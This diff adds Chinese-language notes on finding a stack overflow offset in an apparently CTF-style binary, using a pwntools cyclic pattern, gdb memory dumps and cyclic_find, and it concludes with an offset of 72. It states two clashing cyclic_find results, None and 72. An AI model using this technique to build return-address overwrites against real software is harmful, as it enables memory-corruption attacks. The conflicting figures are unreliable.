@@ -1,0 +1,39 @@
+# 偏移确定的完整过程：gdb 断点实测 + pwntools cyclic_find 反查
+# 目标：确定从 vuln() 的 buf 起始到「返回地址槽」需要多少填充字节
+
+## 1. 生成 De Bruijn 模式并喂给程序
+   cyclic(200, n=8) 前 16 字节 = b'aaaaaaaabaaaaaaa'
+
+## 2. gdb 断在 vuln 的 leave 指令（0x40126f，此时 rbp 尚未被污染）
+
+Breakpoint 1 at 0x40126f
+input> you said: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+
+Breakpoint 1, 0x000000000040126f in vuln ()
+=== 断在 vuln 的 leave 指令 (0x40126f)，此时 rbp 仍有效 ===
+rbp          = 0x7fffffffdf90
+buf 地址      = rbp-0x40 = 0x7fffffffdf50
+saved rbp 槽  = rbp      = 0x7fffffffdf90
+返回地址槽    = rbp+8    = 0x7fffffffdf98
+
+=== buf(64B) + saved rbp(8B) + 返回地址(8B) 的完整布局 ===
+0x7fffffffdf50:	0x6161616161616161	0x6161616161616162
+0x7fffffffdf60:	0x6161616161616163	0x6161616161616164
+0x7fffffffdf70:	0x6161616161616165	0x6161616161616166
+0x7fffffffdf80:	0x6161616161616167	0x6161616161616168
+0x7fffffffdf90:	0x6161616161616169	0x616161616161616a
+0x7fffffffdfa0:	0x616161616161616b
+
+=== 返回地址槽的内容（即被 cyclic 命中的位置）===
+0x7fffffffdf98:	0x616161616161616a
+
+=== 该 8 字节反查 cyclic 偏移 ===
+ret slot bytes = b'jaaaaaaa'
+cyclic_find    = None
+
+## 3. 用 pwntools cyclic_find 反查返回地址槽内容对应的偏移
+   gdb 读到 ret 槽内容 = b'jaaaaaaa'
+   cyclic_find(ret槽内容, n=8) = 72
+
+## 4. 结论
+   OFFSET = 72 = buf[64] + saved rbp[8]
